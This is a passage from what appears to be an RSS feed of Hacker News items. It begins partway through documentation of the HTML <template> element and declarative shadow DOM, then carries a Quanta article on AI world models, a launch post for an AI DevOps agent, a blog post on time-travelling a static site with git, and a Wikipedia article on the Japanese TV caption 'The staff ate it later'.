    This element has no permitted content, because everything nested inside it in the HTML source does not actually become the children of the <template> element. The Node.childNodes property of the <template> element is always empty, and you can only access said nested content via the special content property. However, if you call Node.appendChild() or similar methods on the <template> element, then you would be inserting children into the <template> element itself, which is a violation of its content model and does not actually update the DocumentFragment returned by the content property.
Due to the way the <template> element is parsed, all <html>, <head>, and <body> opening and closing tags inside the template are syntax errors and are ignored by the parser, so <template><head><title>Test</title></head></template> is the same as <template><title>Test</title></template>.
There are two main ways to use the <template> element.
  
    Template document fragment
    By default, the element's content is not rendered.
The corresponding HTMLTemplateElement interface includes a standard content property (without an equivalent content/markup attribute). This content property is read-only and holds a DocumentFragment that contains the DOM subtree represented by the template.
This fragment can be cloned via the cloneNode method and inserted into the DOM.
Be careful when using the content property because the returned DocumentFragment can exhibit unexpected behavior.
For more details, see the Avoiding DocumentFragment pitfalls section below.
  
    Declarative Shadow DOM
    If the <template> element contains the shadowrootmode attribute with a value of either open or closed, the HTML parser will immediately generate a shadow DOM. The element is replaced in the DOM by its content wrapped in a ShadowRoot, which is attached to the parent element.
This is the declarative equivalent of calling Element.attachShadow() to attach a shadow root to an element.
If the element has any other value for shadowrootmode, or does not have the shadowrootmode attribute, the parser generates a HTMLTemplateElement.
Similarly, if there are multiple declarative shadow roots, only the first one is replaced by a ShadowRoot — subsequent instances are parsed as HTMLTemplateElement objects.
  
    Examples
    
  
    Generating table rows
    First we start with the HTML portion of the example.
<table id="producttable">
  <thead>
    <tr>
      <td>UPC_Code</td>
      <td>Product_Name</td>
    </tr>
  </thead>
  <tbody>
    <!-- existing data could optionally be included here -->
  </tbody>
</table>

<template id="productrow">
  <tr>
    <td class="record"></td>
    <td></td>
  </tr>
</template>

First, we have a table into which we will later insert content using JavaScript code. Then comes the template, which describes the structure of an HTML fragment representing a single table row.
Now that the table has been created and the template defined, we use JavaScript to insert rows into the table, with each row being constructed using the template as its basis.
// Test to see if the browser supports the HTML template element by checking
// for the presence of the template element's content attribute.
if ("content" in document.createElement("template")) {
  // Instantiate the table with the existing HTML tbody
  // and the row with the template
  const tbody = document.querySelector("tbody");
  const template = document.querySelector("#productrow");

  // Clone the new row and insert it into the table
  const clone = template.content.cloneNode(true);
  let td = clone.querySelectorAll("td");
  td[0].textContent = "1235646565";
  td[1].textContent = "Stuff";

  tbody.appendChild(clone);

  // Clone the new row and insert it into the table
  const clone2 = template.content.cloneNode(true);
  td = clone2.querySelectorAll("td");
  td[0].textContent = "0384928528";
  td[1].textContent = "Acme Kidney Beans 2";

  tbody.appendChild(clone2);
} else {
  // Find another way to add the rows to the table because
  // the HTML template element is not supported.
}

The result is the original HTML table, with two new rows appended to it via JavaScript:
table {
  background: black;
}
table td {
  background: white;
}


  
    Implementing a declarative shadow DOM
    In this example, a hidden support warning is included at the beginning of the markup. This warning is later set to be displayed via JavaScript if the browser doesn't support the shadowrootmode attribute. Next, there are two <article> elements, each containing nested <style> elements with different behaviors. The first <style> element is global to the whole document. The second one is scoped to the shadow root generated in place of the <template> element because of the presence of the shadowrootmode attribute.
<p hidden>
  ⛔ Your browser doesn't support <code>shadowrootmode</code> attribute yet.
</p>
<article>
  <style>
    p {
      padding: 8px;
      background-color: wheat;
    }
  </style>
  <p>I'm in the DOM.</p>
</article>
<article>
  <template shadowrootmode="open">
    <style>
      p {
        padding: 8px;
        background-color: plum;
      }
    </style>
    <p>I'm in the shadow DOM.</p>
  </template>
</article>

const isShadowRootModeSupported = Object.hasOwn(
  HTMLTemplateElement.prototype,
  "shadowRootMode",
);

document
  .querySelector("p[hidden]")
  .toggleAttribute("hidden", isShadowRootModeSupported);


  
    Declarative Shadow DOM with delegated focus
    This example demonstrates how shadowrootdelegatesfocus is applied to a shadow root that is created declaratively, and the effect this has on focus.
The code first declares a shadow root inside a <div> element, using the <template> element with the shadowrootmode attribute.
This displays both a non-focusable <div> containing text and a focusable <input> element.
It also uses CSS to style elements with :focus to blue, and to set the normal styling of the host element.
<div>
  <template shadowrootmode="open">
    <style>
      :host {
        display: block;
        border: 1px dotted black;
        padding: 10px;
        margin: 10px;
      }
      :focus {
        outline: 2px solid blue;
      }
    </style>
    <div>Clickable Shadow DOM text</div>
    <input type="text" placeholder="Input inside Shadow DOM" />
  </template>
</div>

The second code block is identical except that it sets the shadowrootdelegatesfocus attribute, which delegates focus to the first focusable element in the tree if a non-focusable element in the tree is selected.
<div>
  <template shadowrootmode="open" shadowrootdelegatesfocus>
    <style>
      :host {
        display: block;
        border: 1px dotted black;
        padding: 10px;
        margin: 10px;
      }
      :focus {
        outline: 2px solid blue;
      }
    </style>
    <div>Clickable Shadow DOM text</div>
    <input type="text" placeholder="Input inside Shadow DOM" />
  </template>
</div>

Last of all we use the following CSS to apply a red border to the parent <div> element when it has focus.
div:focus {
  border: 2px solid red;
}

The results are shown below.
When the HTML is first rendered, the elements have no styling, as shown in the first image.
For the shadow root that does not have shadowrootdelegatesfocus set you can click anywhere except the <input> and the focus does not change (if you select the <input> element it will look like the second image).

For the shadow root with shadowrootdelegatesfocus set, clicking on the text (which is non-focusable) selects the <input> element, as this is the first focusable element in the tree.
This also focuses the parent element as shown below.

  
    Avoiding DocumentFragment pitfalls
    When a DocumentFragment value is passed, Node.appendChild and similar methods move only the child nodes of that value into the target node. Therefore, it is usually preferable to attach event handlers to the children of a DocumentFragment, rather than to the DocumentFragment itself.
Consider the following HTML and JavaScript:
  
    HTML
    <div id="container"></div>

<template id="template">
  <div>Click me</div>
</template>

  
    JavaScript
    const container = document.getElementById("container");
const template = document.getElementById("template");

function clickHandler(event) {
  event.target.append(" — Clicked this div");
}

const firstClone = template.content.cloneNode(true);
firstClone.addEventListener("click", clickHandler);
container.appendChild(firstClone);

const secondClone = template.content.cloneNode(true);
secondClone.children[0].addEventListener("click", clickHandler);
container.appendChild(secondClone);

  
    Result
    Since firstClone is a DocumentFragment, only its children are added to container when appendChild is called; the event handlers of firstClone are not copied. In contrast, because an event handler is added to the first child node of secondClone, the event handler is copied when appendChild is called, and clicking on it works as one would expect.

  
    Technical summary
    
  
    
      
        Content categories
      
      
        Metadata content,
        flow content,
        phrasing content,
        script-supporting element
      
    
    
      Permitted content
      Nothing (see Usage notes)
    
    
      Tag omission
      None, both the starting and ending tag are mandatory.
    
    
      Permitted parents
      
        Any element that accepts
        metadata content,
        phrasing content, or
        script-supporting elements. Also allowed as a child of a <colgroup>
        element that does not have a
        span attribute.
      
    
    
      Implicit ARIA role
      
        No corresponding role
      
    
    
      Permitted ARIA roles
      No role permitted
    
    
      DOM interface
      HTMLTemplateElement
    
  

  
    Specifications
    
    
      
        Specification
      
    
    
      
              HTML# the-template-element
            
    
  
  
    Browser compatibility
    
  
    See also
    
part and exportparts HTML attributes
<slot> HTML element
:has-slotted, :host, :host(), and :host-context() CSS pseudo-classes
::part and ::slotted CSS pseudo-elements
ShadowRoot interface
Using templates and slots
CSS scoping module
Declarative Shadow DOM (with html) in Using Shadow DOM
Declarative shadow DOM on web.dev (2023)

   
      
    
          ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA['World Models,' an old idea in AI, mount a comeback]]></title>
            <link>https://www.quantamagazine.org/world-models-an-old-idea-in-ai-mount-a-comeback-20250902/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45105710</guid>
            <description><![CDATA[You’re carrying around in your head a model of how the world works. Will AI systems need to do the same?]]></description>
            <content:encoded><![CDATA[
    The latest ambition of artificial intelligence research — particularly within the labs seeking “artificial general intelligence,” or AGI — is something called a world model: a representation of the environment that an AI carries around inside itself like a computational snow globe. The AI system can use this simplified representation to evaluate predictions and decisions before applying them to its real-world tasks. The deep learning luminaries Yann LeCun (of Meta), Demis Hassabis (of Google DeepMind) and Yoshua Bengio (of Mila, the Quebec Artificial Intelligence Institute) all believe world models are essential for building AI systems that are truly smart, scientific and safe. 
The fields of psychology, robotics and machine learning have each been using some version of the concept for decades. You likely have a world model running inside your skull right now — it’s how you know not to step in front of a moving train without needing to run the experiment first. 
So does this mean that AI researchers have finally found a core concept whose meaning everyone can agree upon? As a famous physicist once wrote: Surely you’re joking. A world model may sound straightforward — but as usual, no one can agree on the details. What gets represented in the model, and to what level of fidelity? Is it innate or learned, or some combination of both? And how do you detect that it’s even there at all?

It helps to know where the whole idea started. In 1943, a dozen years before the term “artificial intelligence” was coined, a 29-year-old Scottish psychologist named Kenneth Craik published an influential monograph in which he mused that “if the organism carries a ‘small-scale model’ of external reality … within its head, it is able to try out various alternatives, conclude which is the best of them … and in every way to react in a much fuller, safer, and more competent manner.” Craik’s notion of a mental model or simulation presaged the “cognitive revolution” that transformed psychology in the 1950s and still rules the cognitive sciences today. What’s more, it directly linked cognition with computation: Craik considered the “power to parallel or model external events” to be “the fundamental feature” of both “neural machinery” and “calculating machines.”
The nascent field of artificial intelligence eagerly adopted the world-modeling approach. In the late 1960s, an AI system called SHRDLU wowed observers by using a rudimentary “block world” to answer commonsense questions about tabletop objects, like “Can a pyramid support a block?” But these handcrafted models couldn’t scale up to handle the complexity of more realistic settings. By the late 1980s, the AI and robotics pioneer Rodney Brooks had given up on world models completely, famously asserting that “the world is its own best model” and “explicit representations … simply get in the way.”
It took the rise of machine learning, especially deep learning based on artificial neural networks, to breathe life back into Craik’s brainchild. Instead of relying on brittle hand-coded rules, deep neural networks could build up internal approximations of their training environments through trial and error and then use them to accomplish narrowly specified tasks, such as driving a virtual race car. In the past few years, as the large language models behind chatbots like ChatGPT began to demonstrate emergent capabilities that they weren’t explicitly trained for — like inferring movie titles from strings of emojis, or playing the board game Othello — world models provided a convenient explanation for the mystery. To prominent AI experts such as Geoffrey Hinton, Ilya Sutskever and Chris Olah, it was obvious: Buried somewhere deep within an LLM’s thicket of virtual neurons must lie “a small-scale model of external reality,” just as Craik imagined.

The truth, at least so far as we know, is less impressive. Instead of world models, today’s generative AIs appear to learn “bags of heuristics”: scores of disconnected rules of thumb that can approximate responses to specific scenarios, but don’t cohere into a consistent whole. (Some may actually contradict each other.) It’s a lot like the parable of the blind men and the elephant, where each man only touches one part of the animal at a time and fails to apprehend its full form. One man feels the trunk and assumes the entire elephant is snakelike; another touches a leg and guesses it’s more like a tree; a third grasps the elephant’s tail and says it’s a rope. When researchers attempt to recover evidence of a world model from within an LLM — for example, a coherent computational representation of an Othello game board — they’re looking for the whole elephant. What they find instead is a bit of snake here, a chunk of tree there, and some rope.
Of course, such heuristics are hardly worthless. LLMs can encode untold sackfuls of them within their trillions of parameters — and as the old saw goes, quantity has a quality all its own. That’s what makes it possible to train a language model to generate nearly perfect directions between any two points in Manhattan without learning a coherent world model of the entire street network in the process, as researchers from Harvard University and the Massachusetts Institute of Technology recently discovered. 
So if bits of snake, tree and rope can do the job, why bother with the elephant? In a word, robustness: When the researchers threw their Manhattan-navigating LLM a mild curveball by randomly blocking 1% of the streets, its performance cratered. If the AI had simply encoded a street map whose details were consistent — instead of an immensely complicated, corner-by-corner patchwork of conflicting best guesses — it could have easily rerouted around the obstructions.
        
        
Given the benefits that even simple world models can confer, it’s easy to understand why every large AI lab is desperate to develop them — and why academic researchers are increasingly interested in scrutinizing them, too. Robust and verifiable world models could uncover, if not the El Dorado of AGI, then at least a scientifically plausible tool for extinguishing AI hallucinations, enabling reliable reasoning, and increasing the interpretability of AI systems.
That’s the “what” and “why” of world models. The “how,” though, is still anyone’s guess. Google DeepMind and OpenAI are betting that with enough “multimodal” training data — like video, 3D simulations, and other input beyond mere text — a world model will spontaneously congeal within a neural network’s statistical soup. Meta’s LeCun, meanwhile, thinks that an entirely new (and non-generative) AI architecture will provide the necessary scaffolding. In the quest to build these computational snow globes, no one has a crystal ball — but the prize, for once, may just be worth the hype.
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Launch HN: Datafruit (YC S25) – AI for DevOps]]></title>
            <link>https://news.ycombinator.com/item?id=45104974</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45104974</guid>
            <description><![CDATA[Hey HN! We’re Abhi, Venkat, Tom, and Nick and we are building Datafruit (https://datafruit.dev/), an AI DevOps agent. We’re like Devin for DevOps. You can ask Datafruit to check your cloud spend, look for loose security policies, make changes to your IaC, and it can reason across your deployment standards, design docs, and DevOps practices.]]></description>
            <content:encoded><![CDATA[Launch HN: Datafruit (YC S25) – AI for DevOps58 points by nickpapciak 15 hours ago  | hide | past | favorite | 39 commentsHey HN! We’re Abhi, Venkat, Tom, and Nick and we are building Datafruit (https://datafruit.dev/), an AI DevOps agent. We’re like Devin for DevOps. You can ask Datafruit to check your cloud spend, look for loose security policies, make changes to your IaC, and it can reason across your deployment standards, design docs, and DevOps practices.Demo video: https://www.youtube.com/watch?v=2FitSggI7tg.Right now, we have two main methods to interact with Datafruit:(1) automated infrastructure audits— agents periodically scan your environment to find cost optimization opportunities, detect infrastructure drift, and validate your infra against compliance requirements.(2) chat interface (available as a web UI and through slack) — ask the agent questions for real-time insights, or assign tasks directly, such as investigating spend anomalies, reviewing security posture, or applying changes to IaC resources.Working at FAANG and various high-growth startups, we realized that infra work requires an enormous amount of context, often more than traditional software engineering. The business decisions, codebase, and cloud itself are all extremely important in any task that has been assigned. To maximize the success of the agents, we do a fair amount of context engineering. Not hallucinating is super important!One thing which has worked incredibly well for us is a multi-agent system where we have specialized sub-agents with access to specific tool calls and documentation for their specialty. Agents choose to “handoff” to each other when they feel like another agent would be more specialized for the task. However, all agents share the same context (https://cognition.ai/blog/dont-build-multi-agents). We’re pretty happy with this approach, and believe it could work in other disciplines which require high amounts of specialized expertise.Infrastructure is probably the most mission-critical part of any software organization, and needs extremely heavy guardrails to keep it safe. Language models are not yet at the point where they can be trusted to make changes (we’ve talked to a couple of startups where the Claude Code + AWS CLI combo has taken their infra down). Right now, Datafruit receives read-only access to your infrastructure and can only make changes through pull requests to your IaC repositories. The agent also operates in a sandboxed virtual environment so that it could not write cloud CLI commands if it wanted to!Where LLMs can add significant value is in reducing the constant operational inefficiencies that eat up cloud spend and delay deadlines—the small-but-urgent ops work. Once Datafruit indexes your environment, you can ask it to do things like:  "Grant @User write access to analytics S3 bucket for 24 hours"
    -> Creates temporary IAM role, sends least-privilege credentials, auto-revokes tomorrow

  "Find where this secret is used so I can rotate it without downtime"
    -> Discovers all instances of your secret, including old cron-jobs you might not know about, so you can safely rotate your keys


  "Why did database costs spike yesterday?"
    -> Identifies expensive queries, shows optimization options, implements fixes


We charge a straightforward subscription model for a managed version, but we also offer a bring-your-own-cloud model. All of Datafruit can be deployed on Kubernetes using Helm charts for enterprise customers where data can’t leave your VPC.
For the time being, we’re installing the product ourselves on customers' clouds. It doesn’t exist in a self-serve form yet. We’ll get there eventually, but in the meantime if you’re interested we’d love for you guys to email us at founders@datafruit.dev.We would love to hear your thoughts! If you work with cloud infra, we are especially interested in learning about what kinds of work you do which you wish could be offloaded onto an agent.
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Static sites enable a good time travel experience]]></title>
            <link>https://hamatti.org/posts/static-sites-enable-a-good-time-travel-experience/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45104303</guid>
            <description><![CDATA[A static site with version control history enables me to travel into any point in the project’s past and serve the site as it was back in the day.]]></description>
            <content:encoded><![CDATA[
        
        
        
          Aug 30th, 2025
          by Juha-Matti Santala
          
        
	
          
        
	

        
          
        

        
          

  Varun wrote about
  gamifying blogging and personal website maintenance
  which reminded me of the time when
  I awarded myself some badges for blogging.



  I mentioned this to Varun who asked if I had any screenshots of what it looked
  like on my website. My initial answer was “no”, then I looked at Wayback
  Machine but there were not pictures of the badges.



  Then, a bit later it hit me. I don’t need any archived screenshots: my website
  is built with Eleventy and it's static so I can check out a git commit from
  the time I had those badges up, fire up Eleventy and see the website — as it
  was in the spring of 2021.


  That’s a beauty of a static site generator combined with my workflow of
  fetching posts from CMS before build time so each commit contains a full
  snapshot of the website.



  Comparing this to a website that uses a database for posts (like WordPress) or
  a flow where posts from CMS are not stored in version control but rather
  fetched at build time only, my solution makes time travel to (almost) any
  given moment in time a two-command operation (git checkout
  with the right commit hash and
  @11ty/eleventy serve to serve a dev
  server). I say almost because back in the day I wasn’t quite as diligent in
  commiting every change as I was deploying manually and not through version
  control automation.



  A year ago, inspired by Alex Chan’s blog post
  Taking regular screenshots of my website
  I set up a GitHub Action that takes a snapshot of my front page once a month
  to keep a record. At the time, I felt bit sad that I hadn’t started it before.
  However, now that I realised how easy it is for me to go back in time thanks
  to Eleventy and git, I’m not so worried anymore. Maybe I should do a collage
  of changes on my design one day by going through my project history.


One more major point for static site generators!



            
          If something above resonated with you, let's start a discussion about it! Email me at juhamattisantala at gmail dot com and share your thoughts. In 2025, I want to have more deeper discussions with people from around the world and I'd love if you'd be part of that.

        

        

        

        
      ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[The staff ate it later]]></title>
            <link>https://en.wikipedia.org/wiki/The_staff_ate_it_later</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45104289</guid>
            <description><![CDATA[From Wikipedia, the free encyclopedia]]></description>
            <content:encoded><![CDATA[
							

						From Wikipedia, the free encyclopedia
					


"The staff ate it later" as shown on screen
"The staff ate it later" (Japanese: この後、スタッフが美味しくいただきました, romanized: Kono ato, sutaffu ga oishiku itadakimashita) is a caption shown on screen when food appears in a Japanese TV program to indicate that it was not thrown away after filming (it is generally not socially acceptable to discard food in Japan). Some[who?] question the authenticity of this statement or believe the caption lowers the quality of TV programs.



It is thought TV stations first began showing the caption to protect themselves against complaints from viewers who disliked food being handled without consideration in TV variety shows.[1] It is uncertain when this note was first used, but TV producer Kenji Suga [ja] stated viewers complained about the waste of food when a performance using small watermelons was broadcast in Downtown no Gaki no Tsukai ya Arahende!! on Nippon TV. The TV station then showed this note on screen the following year in response.[2]


There are various claims as to whether or not staff actually eat the food that appears in the programs.[1][3][4]


According to AOL News in 2014, the crew on one information program claimed: "It's sometimes impossible for the reporter to eat all the food provided by the restaurant. The reporter is told not to eat it all, but the crew will eat the rest out of consideration and a feeling of obligation towards the restaurant."[4]
Food comic artist Raswell Hosoki [ja] claimed in Meshizanmai Furusatonoaji (Meshizanmai Taste of Hometown) that the note is true. Eriko Miyazaki [ja], a reporter and TV personality for food shows, also claimed the note is true and stated: "The crew eats the rest of the food, at least at the shows I appear in."[5]
In January 2018, Miwa Asao, former professional beach volleyball player and TV personality, posted photos on her blog of staff eating food after recording "Saturday Night! Otona na TV [ja]". She wrote: "This is an on-site photo. The staff ate the rest of the food."[6]


Hitoshi Matsumoto, a comedian and TV host, was asked by sociologist Noritoshi Furuichi about this note in 2014 during the "Wide na Show [ja]" (Fuji Television). He said: "To be honest, I've never seen the crew eat the food. But that just means I haven't seen it. They might've eaten it."[7]
Takeshi Kitano (also known as Beat Takeshi), a Japanese comedian, actor, and filmmaker, referred to an instance where cake was smeared on the floor and said in his book Bakaron: "Liars. Who's going to enjoy cake they splattered all over the floor?"[3] Commentator Tsunehira Furuya also stated that the food featured in the show is not eaten by the staff later and is instead simply thrown into garbage bags.[1]


Commentator Tetsuya Uetaki has commented on displaying the note, saying: "Producers have become more aware as viewers have become more critical after issues such as the Aru Aru Mondai (a natto shortage caused by a program claiming eating natto would make people lose weight), and it's fine as one method for dealing with that." However, Uetaki went on to say: "This shifts responsibility onto the viewers. We can't let it end as simply an empty concession. I want to see variety shows strive to properly handle information and properly put the show together, from the moment they start building it."[8]
Broadcast writer Sotani [ja] commented on the fact that production teams have become more sensitive to this in programs and have begun displaying such notes as an attempt to preempt criticism. He claims this sort of extreme self regulation risks leading to a decline.[9] TV producer Kenji Suga [ja] claims it is necessary for programs to be disconnected from real life and society, to be "dumb and idiotic" to produce laughs.[2]
Columnist Takashi Matsuo argues that adults, not TV shows, should teach children the ethics surrounding the importance of food. He also argues that if a parent is uncomfortable with what a comedian expresses on TV, the right course of action would be to change the channel or turn off the TV, not send a complaint to the TV station.[10] Matsuo also points out the inconsistency that "the staff ate it later" caption is not displayed when large numbers of tomatoes are thrown at the festival of Tomatina in Spain or when athletes spray each other with champagne in celebration of a victory.[10]



^ a b c Furuya, Tsunehira (2017). 「道徳自警団」がニッポンを滅ぼす. East Shinsho: East Press. pp. 35–36. ISBN 978-4-7816-5095-1.

^ a b Wake, Shinya (7 February 2016). "グローブ176号 笑いの力 インタビュー 笑わせるってむずかしい プロデューサー・菅賢治". Asahi Shimbun. p. 6.

^ a b Kitano, Takeshi (2017). バカ論. Shinchosha. pp. 36–37. ISBN 978-4-10-610737-5.

^ a b "テレビ番組の食リポ、完食しているのか？「この後スタッフが美味しく...」は本当か" [Is the staff really eating the rest of the dishes used in the TV show?]. AOL News. 16 April 2014. Archived from the original on 16 September 2014. Retrieved 9 January 2020.

^ Raswell Hosoki, Mayumi Kato, Takako Aonuma, Sachiko Orihara, Junko Kubota, Eiko Kasai, Riyo Mizuki, Takotsumuri, Usami☆, and Somei Yoshino, (2017) Meshizanmai Hurusatonoaji, Bunkasha, BUNKASHA COMICS, ISBN 978-4-8211-3416-8

^ "バラエティの「この後スタッフが美味しく頂きました」　 予防線を張るテロップどこまで必要？" [Variety's "The staff enjoyed the food afterwards": How much precautionary captioning is necessary?]. Oricon News. 13 February 2018. Archived from the original on 18 September 2024. Retrieved 26 December 2020.

^ "松本人志 バラエティならでの葛藤を吐露「食べ物も笑いの1つの小道具として認めてもらえたら」" [Hitoshi Matsumoto, revealing his struggles with variety: "If people would accept food as a prop for laughter..."]. Nagai Times. 28 October 2014. Archived from the original on 2 December 2024. Retrieved 26 December 2020.

^ "近ごろよく見る『お断りテロップ』『視聴者への配慮』か苦情抗議"先逃れ"か ないよりましだが…『番組精査こそ肝心』識者指摘". Chunichi Shimbun. 4 July 2007. p. 15.

^ "1番ものがたり 人物編 売れっ子放送作家 そーたに氏「見せたくない」で金字塔 PTAの土俵に乗らず". Hokkoku Shimbun. 23 February 2012. p. 36.

^ a b Matsuo, Takashi (17 September 2017). "テレビの過剰なテロップ　苦情逃れの保身が目的？" [Is over-annotation on television a self-protection to escape complaints?]. Mainichi Shimbun Digital. Retrieved 26 December 2020.[dead link]







]]></content:encoded>
        </item>
    </channel>
</rss>